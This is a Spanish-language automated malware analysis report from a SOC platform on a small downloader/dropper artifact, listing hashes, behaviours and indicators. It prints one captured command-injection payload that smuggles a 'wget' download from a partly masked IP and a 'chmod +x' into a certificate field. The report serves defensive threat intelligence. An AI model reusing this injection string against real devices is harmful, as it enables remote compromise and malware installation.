# 🧬 Payload Analysis

`6e8abad349f55441b004cad4fd1a584d7dc0084a80d7ffddb4bfd4af1b5ec915`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:01:00+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6e8abad349f55441b004cad4fd1a584d7dc0084a80d7ffddb4bfd4af1b5ec915`
- **SHA1:** `ba0d6a47b5ceced52e5215ed47ef874a5da2243a`
- **MD5:** `2ccdb88ee7f4005b4d04305193f11b6f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 129 B |
| Entropía | 5.25 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget hxxp://89.32.41.XXX/bins/kla.sh -O k;chmod +x
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 89.32.41.XXX | static_analysis |
| url | hxxp://89.32.41.XXX/bins/kla.sh | strings |
| hash | 6e8abad349f55441b004cad4fd1a584d7dc0084a80d7ffddb4bfd4af1b5ec915 | static_analysis |
| command | action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=";cd /tmp;wget hxxp://89.32.41.XXX/bins/kla.sh -O k;chmod +x | strings |
| ip | 85.103.42.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
